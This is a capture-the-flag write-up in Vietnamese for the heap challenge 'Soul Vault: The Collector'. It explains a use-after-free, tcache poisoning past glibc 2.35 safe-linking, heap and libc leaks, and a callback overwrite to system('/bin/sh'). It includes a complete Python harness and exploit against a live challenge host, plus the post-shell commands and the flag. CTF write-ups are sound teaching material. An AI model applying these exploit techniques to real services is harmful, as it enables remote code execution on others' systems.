---
title: "Soul Vault: The Collector"
category: "Pwn"
tags: ["use-after-free", "tcache-poison", "safe-linking", "libc-leak", "function-pointer-overwrite"]
solve_date: "2026-10-09"
language: "vi"
---

# Soul Vault: The Collector

**Flag:** `OWASP{S0ul_St0ne_C0ll3ct0r_UAF_Aw4k3n3d}`
**Dịch vụ:** `nc 145.239.142.129 1338`. **Artifact:** `soul-vault-collector.zip` (1073370 B), chứa `soul_vault` (17336 B), `libc.so.6` (2220400 B), `ld-linux-x86-64.so.2` (236616 B).

## Đề bài

Menu heap 64-bit (Hard, 500 điểm): capture a soul, inspect a soul, release a soul, rename a soul, enter the soul stone. Cờ nằm trong file của instance, không có trong binary; chương trình chỉ sẵn đường gọi `system("/bin/sh")` bên trong `soul_stone_awakens()`. Mục tiêu là lấy được shell trên dịch vụ.

## Phân tích

Bảo vệ của `soul_vault` (đọc bằng `rabin2 -I`/`readelf`): `Type: DYN`, `pic true` (PIE), `GNU_RELRO` đi kèm `FLAGS BIND_NOW` (full RELRO), `GNU_STACK` chỉ `RW` (NX), và có tham chiếu `__stack_chk_fail` (canary). `libc.so.6` đi kèm là `Ubuntu GLIBC 2.35-0ubuntu3.15`, tức safe-linking đang bật và `.rodata` của libc có thông báo kiểm tra `malloc(): unaligned tcache chunk detected` (cùng biến thể `tcache_thread_shutdown(): ...`); `system` có giá trị `0x50d70` trong dynsym của libc.

Cấu trúc vessel: `capture_soul` gọi `malloc(0x38)` cho struct (chunk `0x40`) và `malloc(size)` cho memory với `size` đọc từ prompt `Enter Memory Size (max 1024)`. Field đã xác định: `name` nối tiếp trong struct (bắt đầu tại `+0x00`), `mem` tại `+0x20`, callback tại `+0x28`. `inspect_soul` kết thúc bằng:

```text
0x000018e9  mov rax, qword [rax + 0x28]
0x000018f6  mov rdx, qword [rax + 0x28]
0x000018fe  mov rdi, rax
0x00001901  call rdx
```

Tức là callback nhận **chính con trỏ struct** làm tham số — điểm quyết định của lời giải.

`release_soul` giải phóng memory chunk (field `mem` tại `+0x20`) trước, rồi giải phóng chính struct, tăng `sacrifice_count`, nhưng không ghi `NULL` vào `souls[]` (`.bss` tại `0x40a0`) → UAF trên cả struct lẫn memory chunk, và `rename_soul` vẫn ghi được vào chunk đã release. Đây là primitive đọc/ghi có kiểm soát trên free list.

Với `size` trong khoảng `0x21..0x38`, memory chunk cũng dài `0x40` nên vessel và memory của nó dùng chung tcache bin `0x40`. Sau 4 lần capture với memory `0x30` rồi 4 lần release, thứ tự LIFO là — bin `0x40` dừng ở 7 entry vì trần count của tcache, lần free thứ 8 tràn sang fastbin:

```text
tcache[0x40]  head -> M3 -> S2 -> M2 -> S1 -> M1 -> S0 -> M0 -> NULL
fastbin[0x40] head -> S3 -> NULL
```

Toàn bộ địa chỉ lời giải dùng là **user pointer**, và `M_i = S_i + 0x40`, `S_i = S0 + 0x80*i`.

## Lời giải

**1. Heap leak.** `inspect` vessel 0 in `Name: %s` từ field `name` của struct — sau khi release, đây đúng là 8 byte đầu của user data chunk, tức `next` của S0 được safe-link thành `M0 ^ (slot >> 12)`. `Memory: %s` in 8 byte đầu của M0; M0 là entry cuối của bin nên `next` của nó là `NULL`, giá trị lưu đúng bằng key `(slot >> 12)`. XOR hai chuỗi phục hồi `M0`, suy ra `S0 = M0 - 0x40`. Script kiểm tra `(S0 >> 12) == key` và S0 page-resident trước khi tin. Vì `%s` cắt tại NUL đầu tiên, chuỗi đọc có thể ngắn hơn 8 byte và được pad zero.

**2. Libc leak.** `capture` với memory `0x400` (chunk size `0x410`). Trong layout đã ghi nhận, request này dẫn tới consolidation; kích thước `0x410` tự nó không vượt trần tcache, nên còn phụ thuộc trạng thái bin và allocator; chunk fastbin S3 được chuyển vào bin thường và `fd` của nó trở thành con trỏ vào `main_arena.bins[]`. `inspect` vessel 3 in con trỏ đó qua `Name: %s`. Với `MAIN_ARENA = 0x21ac80` (constant ghi trong script, lấy từ `__libc_free` của libc đi kèm), libc base = `leak - MAIN_ARENA - ((leak - MAIN_ARENA) & 0xFFF)`; phần dư 12 bit phải `<= 0x130` để được chấp nhận. `system = libc + 0x50d70`. Lần capture gây consolidation này lấy M3 làm struct, nên vessel index 4 có struct tại `V = S0 + 0x1c0` — một địa chỉ heap đã biết, **không cần PIE leak**.

**3. Chuẩn bị `V`.** `rename_soul(4, b"/bin/sh\x00" + b"P"*8 + p64(X >> 12))` với `X = V + 0x10` viết vào field `name`: tám byte đầu là `"/bin/sh\0"` (nên `system(V)` == `system("/bin/sh")`), và qword tại `V+0x10` — chính là slot `next` của chunk giả `X` — được đặt bằng `X >> 12` để `REVEAL_PTR` trả về `NULL`, bin không bị nối tới địa chỉ rác.

**4. Tcache poison.** `rename_soul(2, p64(X ^ (S2 >> 12)) + p64(0))` ghi đè `next` của S2 (đầu bin `0x40`) bằng giá trị safe-linked trỏ tới `X`. `X` 16-byte-aligned nên vượt qua kiểm tra `unaligned tcache chunk`.

**5. Ghi đè callback.** `capture(b"writ", 0x30, payload)` pop struct = S2, memory = `X`; 32 byte `payload` đáp xuống `V+0x10 .. V+0x2f`:

```python
payload = p64(X >> 12) + p64(0) + p64(V) + p64(sysaddr)
```

`V+0x20 = p64(V)` (field `mem`, tự tham chiếu), `V+0x28 = p64(system)` (field callback).

**6. Trigger.** `inspect_soul(4)` thực hiện `callback(V)` = `system(V)` = `system("/bin/sh")`. Shell đọc từ chính kết nối:

```console
id; uname -a; ls -la /; cat /flag*; ls /root 2>/dev/null; cat ~/flag* /home/*/flag* ./flag* 2>/dev/null; echo DONE
```

Hằng số và kết quả của lần chạy ghi nhận:

```text
  S0=0x5ae0e12ab2a0 M0=0x5ae0e12ab2e0  libc=0x759cd11fa000 system=0x759cd124ad70
triggered system(); talking to shell
cat: '/flag*': No such file or directory
```

`/flag*` không tồn tại trên instance; cờ nằm ở một trong các đường dẫn được `cat ~/flag* /home/*/flag* ./flag*` quét tới:

```text
OWASP{S0ul_St0ne_C0ll3ct0r_UAF_Aw4k3n3d}
```

## Kết quả

```text
OWASP{S0ul_St0ne_C0ll3ct0r_UAF_Aw4k3n3d}
```

Cờ đọc trực tiếp từ dịch vụ đề bài qua shell RCE. Chưa lưu phản hồi submission.

## Tái hiện

Hai file thuần stdlib (`socket`, `select`, `struct`): lưu block thứ nhất thành `harness.py`, block thứ hai thành `pwn.py` cùng thư mục, rồi chạy `python pwn.py 8` (tham số là số lần thử; leak có thể fail khi layout heap không thỏa điều kiện page, script tự retry).

Điểm cần biết trước khi chạy: stdout của dịch vụ được `setvbuf` theo kiểu `_IOFBF`, nên `harness.py` không đọc theo từng lệnh — nó gửi cả blob "chọn + tham số", gửi thêm các lựa chọn `99\n` để buộc flush, rồi parse log tích lũy bằng `inspect_blocks`.

```python
"""Soul Vault: Collector - harness v2.
Service stdout is fully buffered (setvbuf _IOFBF), so ops are pipelined blindly
and flushed with filler choices; the cumulative log is parsed afterwards."""
import socket, select, struct, time, sys

HOST, PORT = "145.239.142.129", 1338
CB_SOUL = 0x1289          # callback_soul
SOULS = 0x40a0
STONE_STATE = 0x40e0
SACRIFICE = 0x40e4
AWAKENED = 0x40e8

def p64(v):
    return struct.pack("<Q", v & ((1 << 64) - 1))

def u64(b):
    return struct.unpack("<Q", (b + b"\x00" * 8)[:8])[0]

class Dead(Exception):
    pass

class Vault:
    def __init__(self, host=HOST, port=PORT):
        self.s = socket.create_connection((host, port), timeout=20)
        self.all = b""
        self.pos = 0

    def pump(self, idle=0.8, max_rounds=30):
        quiet = 0
        while quiet < 2 and max_rounds > 0:
            max_rounds -= 1
            r, _, _ = select.select([self.s], [], [], idle)
            if not r:
                quiet += 1
                continue
            d = self.s.recv(65536)
            if d == b"":
                raise Dead("closed by service; tail=%r" % (self.all[-200:]))
            self.all += d
            quiet = 0
        return self.all

    def flush(self, n=14, gap=0.05):
        for _ in range(n):
            try:
                self.s.sendall(b"99\n")
            except Exception:
                raise Dead("send failed")
            time.sleep(gap)
        return self.pump()

    def after(self):
        out = self.all[self.pos:]
        self.pos = len(self.all)
        return out

    def step(self, blob, label=""):
        try:
            self.s.sendall(blob)
        except Exception:
            raise Dead("send failed at %s" % label)
        d = self.flush()
        new = self.after()
        return new

    # --- operations (each blob = choice + args) ---
    def cap(self, name, size, mem):
        return self.step(b"1\n" + name + b"\n" + ("%d\n" % size).encode() + mem + b"\n", "cap")
    def insp(self, idx):
        return self.step(b"2\n%d\n" % idx, "insp")
    def rel(self, idx):
        return self.step(b"3\n%d\n" % idx, "rel")
    def ren(self, idx, name):
        return self.step(b"4\n%d\n" % idx + name + b"\n", "ren")
    def stone(self):
        return self.step(b"5\n", "stone")
    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

def inspect_blocks(log):
    """Return list of dicts for each '--- Vessel [k] ---' print."""
    res = []
    i = 0
    while True:
        j = log.find(b"--- Vessel [", i)
        if j < 0:
            break
        k = int(log[j + 12:log.find(b"]", j)])
        seg = log[j:j + 4000]
        m = {}
        for fld, mk in (("name", b"Name: "), ("mem", b"Memory: ")):
            a = seg.find(mk)
            if a < 0:
                m[fld] = None
                continue
            a += len(mk)
            b = seg.find(b"\n", a)
            m[fld] = seg[a:b] if b >= 0 else None
        a = seg.find(b"ID: 0x")
        if a >= 0:
            t = seg[a + 6:]
            digits = b""
            for ch in t[:12]:
                if chr(ch) in "0123456789abcdefABCDEF":
                    digits += bytes([ch])
                else:
                    break
            m["id"] = int(digits, 16) if digits else None
        res.append((k, m))
        i = j + 12
    return res

def heap_leak(v, verbose=True):
    v.cap(b"nomem", 0x30, b"")
    v.rel(0)
    d = v.insp(0)
    blocks = inspect_blocks(d)
    if verbose and blocks:
        print("  blocks:", blocks)
    for k, m in blocks:
        if k != 0:
            continue
        p, u = m.get("name"), m.get("mem")
        if not p or not u or len(p) < 5 or len(u) < 4:
            continue
        pv, uv = u64(p), u64(u)
        S0 = (pv ^ uv) - 0x40
        if (S0 >> 12) == uv and 0x10 <= (S0 & 0xFFF) <= 0xFF0:
            return S0, uv
    return None, None

if __name__ == "__main__":
    for attempt in range(10):
        try:
            v = Vault()
            S0, key = heap_leak(v)
            if not S0:
                print(attempt, "leak fail; last block dump:", repr(v.after()[-300:]))
                v.close(); continue
            tgt = S0 + 0x28
            enc = p64(tgt ^ key)
            if b"\n" in enc:
                print(attempt, "enc has newline, retry"); v.close(); continue
            print("  S0=%#x page=%#x tgt=%#x enc=%s" % (S0, key, tgt, enc.hex()))
            d = v.ren(0, enc + b"Z")
            print("  ren:", repr(d[-120:]))
            d = v.cap(b"q", 0x30, b"")
            print("  cap:", repr(d[-120:]))
            d = v.insp(1)
            print("  insp1:", repr(d[-260:]))
            print(attempt, "S0=%#x" % S0)
            for k, m in inspect_blocks(d):
                if k == 1 and m.get("mem"):
                    val = u64(m["mem"])
                    base = val - CB_SOUL
                    print("   mem bytes:", m["mem"].hex(), "code ptr=%#x pie=%#x aligned=%s" %
                          (val, base, base % 0x1000 == 0))
                    if base % 0x1000 == 0 and base < (1 << 48):
                        print("   *** PIE BASE =", hex(base))
                        v.close(); sys.exit(0)
            v.close()
        except Dead as e:
            print(attempt, "DEAD", e)
        except Exception as e:
            print(attempt, "ERR", type(e).__name__, e)
```

```python
"""Soul Vault: The Collector -- full exploit (no PIE leak required).

Chunks are 0x40 for a vessel struct (malloc(0x38)) and also 0x40 when the
memory request is 0x21..0x38, so vessels and their memories share tcache bin 0x40.
Layout after 4 vessels with small memories + 4 releases (LIFO, all bin 0x40):
    tcache  = [M3, S2, M2, S1, M1, S0, M0]   (7 entries)
    fastbin = [S3]                            (8th free)
S0/M0 are recovered exactly from the freed-link pair, hence every other
chunk address is known (S_i = S0+0x80*i, M_i = S_i+0x40).

 * A 0x400 memory request cannot be served from tcache -> _int_malloc runs
   malloc_consolidate() -> the fastbin chunk S3 is put in a bin -> its fd is
   &main_arena bins[] (libc pointer) -> leaked with "Name: %s" of vessel 3.
 * The consolidation-triggering capture takes M3 as its vessel struct, so
   V = M3 is an allocated vessel at a known address.
 * Poison bin-0x40 head S2 so the next capture's *memory* chunk is X = V+0x10
   (16 bytes aligned -> passes the safe-linking alignment check; its stored
   next is set to p64(X>>12) so it decodes to NULL and nothing is dereferenced).
   V+0x10 .. V+0x2f then hold attacker bytes, i.e. V->callback := system(),
   while V->name = "/bin/sh".
 * inspect(V) executes soul->callback(soul) == system("/bin/sh").
"""
import re, struct, sys, time
from harness import Vault, Dead, u64, p64, inspect_blocks

MAIN_ARENA = 0x21ac80        # from __libc_free: lea rdi, 0x21ac80
SYSTEM = 0x50d70             # dynsym
SMALL = 0x30                 # -> chunk 0x40 (same bin as the vessel struct)
BIG = 0x400                  # -> chunk 0x408, above the fastbin range


def fld(d, want, idx):
    for k, m in inspect_blocks(d):
        if k == idx and m.get(want) is not None:
            return m[want]
    return None


def has_nl(*parts):
    return any(b"\n" in p for p in parts)


def page_ok(x):
    return 0x10 <= (x & 0xFFF) <= 0xFF0


def build():
    v = Vault()
    # ---- 1. four vessels with bin-0x40 memories, then free all of them
    for i in range(4):
        v.cap(b"v%d" % i, SMALL, b"")
    for i in range(4):
        v.rel(i)

    # ---- 2. heap leak from the S0/M0 freed-link pair
    d = v.insp(0)
    p, u = fld(d, "name", 0), fld(d, "mem", 0)
    if not p or not u or len(p) < 5 or len(u) < 4:
        v.close(); return None, "heap leak fail", None
    pv, uv = u64(p), u64(u)
    M0 = pv ^ uv
    S0 = M0 - 0x40
    if (S0 >> 12) != uv or not page_ok(S0):
        v.close(); return None, "heap leak inconsistent", None

    # ---- 3. trigger malloc_consolidate, leak libc out of the retired fastbin chunk
    v.cap(b"trig", BIG, b"")
    d = v.insp(3)
    m3 = fld(d, "name", 3)
    if not m3 or len(m3) < 5:
        v.close(); return None, "libc leak fail", S0
    leak = u64(m3)
    k = (leak - MAIN_ARENA) & 0xFFF
    if k > 0x130:
        v.close(); return None, "bins offset %#x implausible (leak=%#x)" % (k, leak), S0
    libc = leak - MAIN_ARENA - k
    sysaddr = libc + SYSTEM
    if sysaddr >> 48 or has_nl(p64(sysaddr)):
        v.close(); return None, "system address unusable", S0
    print("  S0=%#x M0=%#x  libc=%#x system=%#x  (bins at main_arena%#x)" %
          (S0, M0, libc, sysaddr, k))

    # ---- 4. V = M3 (struct of the capture above): put "/bin/sh" and the
    #          self-referential next pointer into V's name field.
    V = S0 + 0x1c0                        # M3 = struct taken by the capture above
    X = V + 0x10                          # fake memory chunk, 16-aligned
    if X & 0xF:
        v.close(); return None, "X unaligned", S0
    name = b"/bin/sh\x00" + b"P" * 8 + p64(X >> 12)
    if has_nl(name):
        v.close(); return None, "name newline", S0
    v.ren(4, name)

    # ---- 5. poison bin-0x40 head (S2) so that the next memory chunk is X
    S2 = S0 + 0x100
    enc = p64(X ^ (S2 >> 12))
    if has_nl(enc):
        v.close(); return None, "enc newline", S0
    v.ren(2, enc + p64(0))

    # ---- 6. capture: struct = S2, memory = X -> 32-byte write over V->callback
    payload = p64(X >> 12) + p64(0) + p64(V) + p64(sysaddr)
    if has_nl(payload):
        v.close(); return None, "payload newline", S0
    v.cap(b"writ", SMALL, payload)

    # ---- 7. inspect(V) -> soul->callback(V) == system("/bin/sh")
    d = v.insp(4)
    info = dict(S0=S0, M0=M0, libc=libc, V=V, X=X)
    return v, None, info


if __name__ == "__main__":
    for i in range(int(sys.argv[1] if len(sys.argv) > 1 else 8)):
        try:
            v, err, info = build()
            if err:
                print(i, "fail:", err)
                time.sleep(0.4)
                continue
            print(i, "triggered system(); talking to shell")
            time.sleep(0.4)
            v.s.sendall(b"id; uname -a; ls -la /; cat /flag*; ls /root 2>/dev/null; "
                        b"cat ~/flag* /home/*/flag* ./flag* 2>/dev/null; echo DONE\n")
            time.sleep(1.2)
            v.pump(1.5, 40)
            txt = v.all
            flags = re.findall(rb"OWASP\{[^}\n]{1,200}\}", txt)
            print("---- tail ----")
            print(txt[-1200:].decode("latin1"))
            print("FLAGS:", flags)
            v.close()
            break
        except Dead as e:
            print(i, "DEAD:", e)
        except Exception as e:
            print(i, "ERR:", type(e).__name__, e)
```

Kiểm tra tĩnh:

```console
$ rabin2 -I soul_vault
$ readelf -dW soul_vault | grep -E "BIND_NOW|RELRO"
$ readelf -sW libc.so.6 | grep -w system
$ r2 -q -c "aa; pdf @ sym.release_soul" soul_vault
$ r2 -q -c "aa; pd 30 @ 0x18e5" soul_vault
```

`MAIN_ARENA` và `SYSTEM` là offset của `libc.so.6` đi kèm, còn `0x1289`, `0x40a0`, `0x40e0`, `0x40e4`, `0x40e8` là offset của `soul_vault`; tất cả phải đọc lại nếu dịch vụ đổi binary. Chạy local với `ld-linux-x86-64.so.2` + `libc.so.6` đi kèm chỉ có tác dụng kiểm tra logic; để lấy cờ thật vẫn cần instance remote.
